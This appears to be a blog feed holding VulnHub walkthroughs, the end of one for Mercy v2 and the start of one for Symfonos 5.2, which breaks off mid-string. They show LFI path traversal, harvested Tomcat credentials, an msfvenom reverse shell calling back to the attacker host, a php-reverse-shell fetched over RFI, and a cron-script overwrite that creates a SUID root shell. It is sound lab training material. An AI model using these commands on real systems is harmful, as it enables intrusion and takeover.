8080/tcp open http-proxy MAC Address: 08:00:27:CC:62:BC (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 18.76 seconds TCP/80 TCP/22 Recon on the newly opened ports nmap complete scan ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot] └─# nmap $ip -A -sV -sC -p22,80 -oN ../scans/new_ports.txt Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 00:36 +08 Nmap scan report for 192.168.110.19 Host is up (0.00051s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 93:64:02:58:62:0e:e7:85:50:d9:97:ea:8d:01:68:f6 (DSA) | 2048 13:77:33:9a:49:c0:51:dc:8f:fb:c8:33:17:b2:05:71 (RSA) | 256 a2:25:3c:cf:ac:d7:0f:ae:2e:8c:c5:14:c4:65:c1:59 (ECDSA) |_ 256 33:12:1b:6a:98:da:ea:9d:8c:09:94:ed:44:8d:4e:5b (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) | http-robots.txt: 2 disallowed entries |_/mercy /nomercy |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: Apache/2.4.7 (Ubuntu) MAC Address: 08:00:27:CC:62:BC (Oracle VirtualBox virtual NIC) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 0.51 ms 192.168.110.19 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds Directory enumerate TCP/80 - HTTP ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2] └─# ffuf -u http://$ip:80/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.19:80/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ .htpasswd.txt [Status: 403, Size: 294, Words: 21, Lines: 11] .htpasswd.php [Status: 403, Size: 294, Words: 21, Lines: 11] index.html [Status: 200, Size: 90, Words: 9, Lines: 6] robots.txt [Status: 200, Size: 50, Words: 4, Lines: 4] server-status [Status: 403, Size: 294, Words: 21, Lines: 11] time [Status: 200, Size: 79, Words: 15, Lines: 3] :: Progress: [18460/18460] :: Job [1/1] :: 2255 req/sec :: Duration: [0:00:08] :: Errors: 0 :: time robots.txt TCP/80 (HTTP) - RIPS 0.53 LFI Exploit View enumerated directories time robots.txt ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot] └─# curl -s http://$ip/robots.txt User-agent: * Disallow: /mercy Disallow: /nomercy /mercy/index ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot] └─# curl -s http://$ip/mercy/index Welcome to Mercy! We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system. /nomercy RIPS 0.53 Search exploits for RIPS 0.53 Exploit Title Path RIPS 0.53 - Multiple Local File Inclusions php/webapps/18660.txt Try php/webapps/18660.txt POC http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd Check for vulnerability Fuzz for files that can lead to RCE ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit] └─# ffuf -u http://$ip/nomercy/windows/code.php?file=../../../../../../..FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fw 14,5 Could not find any files that could lead to RCE At TCP/8080 - HTTP, tomcat is running, this will lead us to RCE Why is it useful? We can enumerate tomcat files &amp;amp; locate tomcat-usr.xml which contains credentials via the LFI exploit If are able to include tomcat-usr.xml, we can login &amp;amp; upload a reverse shell at tomcat. Tomcat file directory structure /etc/tomcat7/ ├── Catalina │ └── localhost │ ├── ROOT.xml │ └── solr.xml -&amp;gt; ../../../solr/solr-tomcat.xml ├── catalina.properties ├── context.xml ├── logging.properties ├── policy.d │ ├── 01system.policy │ ├── 02debian.policy │ ├── 03catalina.policy │ ├── 04webapps.policy │ ├── 05solr.policy -&amp;gt; /etc/solr/tomcat.policy │ └── 50local.policy ├── server.xml ├── tomcat-users.xml &amp;lt;------------ what we want └── web.xml /var/lib/tomcat7 ├── common │ └── classes ├── conf -&amp;gt; /etc/tomcat7 &amp;lt;------------ what we want ├── logs -&amp;gt; ../../log/tomcat7 ├── server │ └── classes ├── shared │ └── classes ├── webapps │ └── ROOT │ ├── index.html │ └── META-INF │ └── context.xml └── work -&amp;gt; ../../cache/tomcat7 /var/lib/tomcat7/conf/tomcat-users.xml /etc/tomcat7/tomcat-users.xml Good explanation of tomcat directory structure Visit http://192.168.110.19:8080/index.html again /etc/tomcat7/tomcat-users.xml Include /etc/tomcat7/tomcat-users.xml thisisasuperduperlonguser:heartbreakisinevitable fluffy:freakishfluffybunny TCP/8080 (HTTP) - Tomcat (Upload Reverse Shell) Proceed to http://192.168.110.19:8080/manager/html Login w/ thisisasuperduperlonguser:heartbreakisinevitable Create our WAR reverse shell payload Create WAR reverse shell ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit] └─# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.110.4 LPORT=4444 -f war -o rev86.war Find out the jsp file to execute our reverse shell ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit] └─# jar -xvf rev86.war Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true created: META-INF/ inflated: META-INF/MANIFEST.MF created: WEB-INF/ inflated: WEB-INF/web.xml inflated: jfzomlykmswjkh.jsp jfzomlykmswjkh.jsp Deploy rev86.war Execute reverse shell at ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2] └─# curl http://192.168.110.19:8080/rev86/jfzomlykmswjkh.jsp Obtain tomcat7 shell Local Flag cd / cat local.txt Plz have mercy on me! :-( :-( Privilege EscalationFluffy - Via Creds Found Earlier we found fluffy’s creds at tomcat-users.xml, switch to fluffy w/ fluffy:freakishfluffybunny tomcat7@MERCY:/usr/local$ su fluffy Password: Added user fluffy. $ id uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy) Root - Via Cronjob View files in fluffy home directory fluffy@MERCY:~$ find $(pwd) /home/fluffy /home/fluffy/.gnupg /home/fluffy/.gnupg/trustdb.gpg /home/fluffy/.gnupg/pubring.gpg /home/fluffy/.gnupg/gpg.conf /home/fluffy/.bash_history /home/fluffy/.ssh /home/fluffy/.ssh/authorized_keys /home/fluffy/.private /home/fluffy/.private/secrets /home/fluffy/.private/secrets/backup.save /home/fluffy/.private/secrets/timeclock /home/fluffy/.private/secrets/.secrets fluffy@MERCY:~$ /.private/secrets View files in /.private/secrets fluffy@MERCY:~/.private/secrets$ ls -la total 20 drwxr-xr-x 2 fluffy fluffy 4096 Nov 20 2018 . drwxr-xr-x 3 fluffy fluffy 4096 Nov 20 2018 .. -rwxr-xr-x 1 fluffy fluffy 37 Nov 20 2018 backup.save -rw-r--r-- 1 fluffy fluffy 12 Nov 20 2018 .secrets -rwxrwxrwx 1 root root 222 Nov 20 2018 timeclock fluffy@MERCY:~/.private/secrets$ timelock writable Snoop processes to see the cronjob being executed tomcat7@MERCY:/tmp$ ./pspy ./pspy pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done 2022/02/08 11:33:43 CMD: UID=0 PID=9 | 2022/02/08 11:33:43 CMD: UID=0 PID=88 | 2022/02/08 11:33:43 CMD: UID=0 PID=87 | SNIP 2022/02/08 11:36:01 CMD: UID=0 PID=23347 | CRON 2022/02/08 11:36:01 CMD: UID=0 PID=23349 | bash /home/fluffy/.private/secrets/timeclock 2022/02/08 11:36:01 CMD: UID=0 PID=23348 | /bin/sh -c bash /home/fluffy/.private/secrets/timeclock 2022/02/08 11:36:33 CMD: UID=0 PID=23364 | /bin/bash /sbin/dhclient-script 2022/02/08 11:36:33 CMD: UID=0 PID=23361 | /bin/bash /sbin/dhclient-script 2022/02/08 11:36:33 CMD: UID=0 PID=23365 | 2022/02/08 11:36:33 CMD: UID=0 PID=23373 | /bin/sh /usr/sbin/invoke-rc.d smbd reload 2022/02/08 11:36:33 CMD: UID=0 PID=23372 | /bin/sh /usr/sbin/invoke-rc.d smbd reload 2022/02/08 11:36:33 CMD: UID=0 PID=23371 | /bin/sh /usr/sbin/invoke-rc.d smbd reload 2022/02/08 11:36:33 CMD: UID=0 PID=23377 | xargs 2022/02/08 11:36:33 CMD: UID=0 PID=23376 | 2022/02/08 11:36:33 CMD: UID=0 PID=23375 | /bin/sh /usr/sbin/invoke-rc.d smbd reload 2022/02/08 11:36:33 CMD: UID=0 PID=23381 | /bin/sh /usr/sbin/invoke-rc.d smbd reload 2022/02/08 11:36:33 CMD: UID=0 PID=23380 | /bin/sh /usr/sbin/invoke-rc.d smbd reload 2022/02/08 11:36:33 CMD: UID=0 PID=23379 | /bin/sh /usr/sbin/invoke-rc.d smbd reload 2022/02/08 11:36:33 CMD: UID=0 PID=23384 | grep -q start/ 2022/02/08 11:36:33 CMD: UID=0 PID=23383 | status smbd 2022/02/08 11:36:33 CMD: UID=0 PID=23388 | tr -d ) 2022/02/08 11:36:33 CMD: UID=0 PID=23387 | awk {print $3} 2022/02/08 11:36:33 CMD: UID=0 PID=23386 | initctl version 2022/02/08 11:36:33 CMD: UID=0 PID=23385 | /bin/sh /usr/sbin/invoke-rc.d smbd reload 2022/02/08 11:36:33 CMD: UID=0 PID=23389 | dpkg --compare-versions 1.12.1 ge 0.9.7 2022/02/08 11:36:33 CMD: UID=0 PID=23391 | grep -q ^ start on 2022/02/08 11:36:33 CMD: UID=0 PID=23390 | initctl show-config -e smbd 2022/02/08 11:36:33 CMD: UID=0 PID=23396 | /bin/sh /sbin/resolvconf -a eth0.dhclient 2022/02/08 11:36:33 CMD: UID=0 PID=23395 | /bin/bash /sbin/dhclient-script 2022/02/08 11:36:33 CMD: UID=0 PID=23394 | smbd -F 2022/02/08 11:36:33 CMD: UID=0 PID=23399 | sed -e s/[[:blank:]]\\+$// -e /^$/d 2022/02/08 11:36:33 CMD: UID=0 PID=23398 | sed -e s/#.*$// -e s/[[:blank:]]\\+$// -e s/^[[:blank:]]\\+// -e s/[[:blank:]]\\+/ /g -e /^nameserver/!b ENDOFCYCLE -e s/$/ / -e s/\\([:. ]\\)0\\+/\\10/g -e s/\\([:. ]\\)0\\([123456789abcdefABCDEF][[:xdigit:]]*\\)/\\1\\2/g -e /::/b ENDOFCYCLE; s/ \\(0[: ]\\)\\+/ ::/ -e /::/b ENDOFCYCLE; s/:\\(0[: ]\\)\\+/::/ -e : ENDOFCYCLE - 2022/02/08 11:36:33 CMD: UID=0 PID=23397 | /bin/sh /sbin/resolvconf -a eth0.dhclient 2022/02/08 11:39:01 CMD: UID=0 PID=23407 | CRON 2022/02/08 11:39:01 CMD: UID=0 PID=23406 | CRON 2022/02/08 11:39:01 CMD: UID=0 PID=23410 | bash /home/fluffy/.private/secrets/timeclock 2022/02/08 11:39:01 CMD: UID=0 PID=23409 | CRON 2022/02/08 11:39:01 CMD: UID=0 PID=23408 | /bin/sh -c bash /home/fluffy/.private/secrets/timeclock 2022/02/08 11:39:01 CMD: UID=0 PID=23414 | php5 -c /etc/php5/apache2/php.ini -d error_reporting=&#39;~E_ALL&#39; -r print ini_get(&quot;session.gc_maxlifetime&quot;); 2022/02/08 11:39:01 CMD: UID=0 PID=23412 | /bin/sh -e /usr/lib/php5/maxlifetime 2022/02/08 11:39:01 CMD: UID=0 PID=23417 | /bin/sh /usr/lib/php5/sessionclean /var/lib/php5 24 2022/02/08 11:39:01 CMD: UID=0 PID=23420 | xargs -i touch -c {} 2022/02/08 11:39:01 CMD: UID=0 PID=23419 | awk -- { if (NR &amp;gt; 1) { print $9; } } 2022/02/08 11:39:01 CMD: UID=0 PID=23418 | /usr/bin/lsof -w -l +d /var/lib/php5 2022/02/08 11:39:01 CMD: UID=0 PID=23421 | /usr/bin/lsof -w -l +d /var/lib/php5 2022/02/08 11:36:01: /bin/sh -c bash /home/fluffy/.private/secrets/timeclock 2022/02/08 11:39:01 /bin/sh -c bash /home/fluffy/.private/secrets/timeclock timeclock is executed by root cronjob every 3 minutes Replace timeclock w/ a script to create a root shell fluffy@MERCY:~/.private/secrets$ printf &#39;#!/bin/bash\\n\\ncp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash\\n&#39; &amp;gt; timeclock; Wait for cronjob to execute Root shell obtained Root Flag rootbash-4.3# cat author-secret.txt proof.txt Hi! Congratulations on being able to root MERCY. The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques. The author would also like to thank a great friend who he always teases as &quot;plead for mercy&quot;. She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author&#39;s rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author. The author, as &quot;plead for mercy&quot; knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.) You&#39;ll always be remembered, &quot;plead for mercy&quot;, and Offensive Security, for making me plead for mercy! Congratulations, once again, for you TRIED HARDER! Regards, The Author Congratulations on rooting MERCY. :-) " }, { "title": "Vulnhub - Symfonos 5.2", "url": "/posts/Symfonos-5.2/", "categories": "Vulnhub, Linux", "tags": "exploit/ldap-injection, exploit/file-inclusion/lfi, linux-priv-esc/sudo/gtfo-bin, tcp/389-636-ldap", "date": "2022-02-07 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Mon Feb 7 02:29:43 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Symfonos-5.2/192.168.110.18/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Symfonos-5.2/192.168.110.18/scans/xml/_full_tcp_nmap.xml 192.168.110.18adjust_timeouts2: packet supposedly had rtt of -530721 microseconds. Ignoring time.Nmap scan report for 192.168.110.18Host is up, received arp-response (0.00073s latency).Scanned at 2022-02-07 02:29:44 +08 for 20sNot shown: 65531 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: | 2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfhCNEk87fJIphggJ/K7+9vu2pm9OmRmuYZ4tIPDCr42LgzGp6EIWpz5FXo98F1iq1pNASEjcMqqpCxuhhOFSlf3pPA00Rka4/0pmlmtIl5jSE6cpexIXzINzLC6YXDt59JFuOi0PgsbBYbIWsRdNxPboBDELeilgNairkx3wakNr39Di1SmrpQyQ54EbpusuNZPZL9eBjgEScXrx+MCnA4gyQ+VwEbMXDBfC6q5zO+poZQ1wkAqg9+LFvd2RuwGB+06yFfVn84UpBh4Fxf+cpnKG0zJalRfI8ZhUgnvEnU7cIp8Yb94pUzXf1+m1Vsau8+0myI0aaljHt4RfSfI3T| 256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHUvkrh2jAIVELCTy59BYzC3B0S4/jKkYOmS6N7anjrxvHW59thSrs7+3pvVhM5X0Og+FV4zkrMMfvw5jwTygeA=| 256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxA6/wOoEAbxcDJX8zdCYFQzulYfpxK4n4e7bUSUeeC80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))|_http-title: Site doesn&#39;t have a title (text/html).| http-methods: |_ Supported Methods: HEAD GET POST OPTIONS|_http-server-header: Apache/2.4.29 (Ubuntu)389/tcp open ldap syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X636/tcp open ldapssl? syn-ack ttl 63MAC Address: 08:00:27:E9:3A:07 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/7%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=6200OS:13AC%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OS:OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4OS:ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)OS:ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=SOS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%QOS:=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%SOS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(OS:R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 20.963 days (since Mon Jan 17 03:23:45 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.73 ms 192.168.110.18Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Feb 7 02:30:04 2022 -- 1 IP address (1 host up) scanned in 22.20 secondsTCP/80 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/Symfonos-5.2]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.18/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.hta.html [Status: 403, Size: 279, Words: 20, Lines: 10].htaccess [Status: 403, Size: 279, Words: 20, Lines: 10].htaccess.html [Status: 403, Size: 279, Words: 20, Lines: 10].htpasswd.html [Status: 403, Size: 279, Words: 20, Lines: 10].hta [Status: 403, Size: 279, Words: 20, Lines: 10].htpasswd.php [Status: 403, Size: 279, Words: 20, Lines: 10]admin.php [Status: 200, Size: 1650, Words: 707, Lines: 40]admin.php [Status: 200, Size: 1650, Words: 707, Lines: 40].php [Status: 403, Size: 279, Words: 20, Lines: 10].html [Status: 403, Size: 279, Words: 20, Lines: 10] [Status: 200, Size: 207, Words: 18, Lines: 19].hta.txt [Status: 403, Size: 279, Words: 20, Lines: 10].hta.php [Status: 403, Size: 279, Words: 20, Lines: 10].htaccess.txt [Status: 403, Size: 279, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 279, Words: 20, Lines: 10].htaccess.php [Status: 403, Size: 279, Words: 20, Lines: 10].htpasswd.txt [Status: 403, Size: 279, Words: 20, Lines: 10]home.php [Status: 302, Size: 0, Words: 1, Lines: 1]index.html [Status: 200, Size: 207, Words: 18, Lines: 19]index.html [Status: 200, Size: 207, Words: 18, Lines: 19]logout.php [Status: 302, Size: 0, Words: 1, Lines: 1]server-status [Status: 403, Size: 279, Words: 20, Lines: 10]static [Status: 301, Size: 317, Words: 20, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 1544 req/sec :: Duration: [0:00:05] :: Errors: 0 :: admin.phpFFUF - directory-list-2.3-medium.txt┌──(root💀kali)-[~/vulnHub/Symfonos-5.2]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.18/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________home.php [Status: 302, Size: 0, Words: 1, Lines: 1]static [Status: 301, Size: 317, Words: 20, Lines: 10]admin.php [Status: 200, Size: 1650, Words: 707, Lines: 40]logout.php [Status: 302, Size: 0, Words: 1, Lines: 1]portraits.php [Status: 200, Size: 165, Words: 10, Lines: 4].php [Status: 403, Size: 279, Words: 20, Lines: 10] [Status: 200, Size: 207, Words: 18, Lines: 19].html [Status: 403, Size: 279, Words: 20, Lines: 10]server-status [Status: 403, Size: 279, Words: 20, Lines: 10]:: Progress: [882240/882240] :: Job [1/1] :: 4221 req/sec :: Duration: [0:03:44] :: Errors: 0 :: portraits.php home.phpInitial FootholdTCP/80 (HTTP) - LDAP Injection View enumerated directories admin.php portraits.php home.php redirected to admin.php Determine if admin.php is susceptible to SQLi, failed Results Tried admin:admin, failed Determine if admin.php is susceptible to LDAP Injection, since TCP/389,636 - LDAP is up LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input, when fails to properly sanitize user input, it’s possible to modify LDAP statements to bypass login, execute commands. Setup Results TCP/80 (HTTP) - File Inclusion Redirected to home.php url=http://127.0.0.1/portraits.php Could be susceptible to LFI/RFI RFI2RCE - Failed Download php-reverse-shell.php Start a webserver hosting php-reverse-shell.php ┌──(root💀kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Download php-revrese-shell.php into the victim ┌──(root💀kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/loot/http] └─# curl -H &quot;Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0&quot; http://symfonos.local/home.php?url=http://192.168.110.4/php-reverse-shell.php ┌──(root💀kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 192.168.110.18 - - [07/Feb/2022 03:55:58] &quot;GET /php-reverse-shell.php HTTP/1.0&quot; 200 - Execute reverse shell ┌──(root💀kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit] └─# curl -H &quot;Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0&quot; http://symfonos.local/home.php?url=http://192.168.110.4/php-reverse-shell.php? Failed, php code is not executed. LFI2RCE - Failed Fuzz for files in include that could lead to RCE ┌──(root💀kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit] └─# ffuf -u &quot;http://symfonos.local/home.php?url=../../../../../..FUZZ&quot; -H &quot;Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0&quot; -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fw 117 Browse through the files, could not find any that leads to RCE Instead of doing RFI, use PHP wrapper to view the source code login.php Able to obtain LDAP credentials Base64 Encode home.php # Payload: ?url=php://filter/convert.base64-encode/resource=admin.php┌──(root💀kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit]└─# curl -s -H &quot;Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0&quot; &#39;http://symfonos.local/home.php?url=php://filter/convert.base64-encode/resource=login.php&#39; | curl -s -H &quot;Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0&quot; &#39;http://symfonos.local/home.php?url=php://filter/convert.base64-encode/resource=admin.php&#39; | tail -3&amp;lt;center&amp;gt;PD9waHAKc2Vzc2lvbl9zdGFydCgpOwoKaWYoaXNzZXQoJF9TRVNTSU9OWyJsb2dnZWRpbiJdKSAmJiAkX1NFU1NJT05bImxvZ2dlZGluIl0gPT09IHRydWUpewogICAgaGVhZGVyKCJsb2NhdGlvbjogaG9tZS5waHAiKTsKICAgIGV4aXQ7Cn0KCmZ1bmN0aW9uIGF1dGhMZGFwKCR1c2VybmFtZSwgJHBhc3N3b3JkKSB7CiAgJGxkYXBfY2ggPSBsZGFwX2Nvbm5lY3QoImxkYXA6Ly8xNzIuMTguMC4yMiIpOwoKICBsZGFwX3NldF9vcHRpb24oJGxkYXBfY2gsIExEQVBfT1BUX1BST1RPQ09MX1ZFUlNJT04sIDMpOwoKICBpZiAoISRsZGFwX2NoKSB7CiAgICByZXR1cm4gRkFMU0U7CiAgfQoKICAkYmluZCA9IGxkYXBfYmluZCgkbGRhcF9jaCwgImNuPWFkbWluLGRjPXN5bWZvbm9zLGRjPWxvY2FsIiwgInFNRGR5WmgzY1Q2ZWVBV0QiKTsKCiAgaWYgKCEkYmluZCkgewogICAgcmV0dXJuIEZBTFNFOwogIH0KCiAgJGZpbHRlciA9ICIoJih1aWQ9JHVzZXJuYW1lKSh1c2VyUGFzc3dvcmQ9JHBhc3N3b3JkKSkiOwogICRyZXN1bHQgPSBsZGFwX3NlYXJjaCgkbGRhcF9jaCwgImRjPXN5bWZvbm9zLGRjPWxvY2FsIiwgJGZpbHRlcik7CgogIGlmICghJHJlc3VsdCkgewogICAgcmV0dXJuIEZBTFNFOwogIH0KCiAgJGluZm8gPSBsZGFwX2dldF9lbnRyaWVzKCRsZGFwX2NoLCAkcmVzdWx0KTsKCiAgaWYgKCEoJGluZm8pIHx8ICgkaW5mb1siY291bnQiXSA9PSAwKSkgewogICAgcmV0dXJuIEZBTFNFOwogIH0KCiAgcmV0dXJuIFRSVUU7Cgp9CgppZihpc3NldCgkX0dFVFsndXNlcm5hbWUnXSkgJiYgaXNzZXQoJF9HRVRbJ3Bhc3N3b3JkJ10pKXsKCiR1c2VybmFtZSA9IHVybGRlY29kZSgkX0dFVFsndXNlcm5hbWUnXSk7CiRwYXNzd29yZCA9IHVybGRlY29kZSgkX0dFVFsncGFzc3dvcmQnXSk7CgokYklzQXV0aCA9IGF1dGhMZGFwKCR1c2VybmFtZSwgJHBhc3N3b3JkKTsKCmlmICghICRiSXNBdXRoICkgewoJJG1zZyA9ICJJbnZhbGlkIGxvZ2luIjsKfSBlbHNlIHsKICAgICAgICAkX1NFU1NJT05bImxvZ2dlZGluIl0gPSB0cnVlOwoJ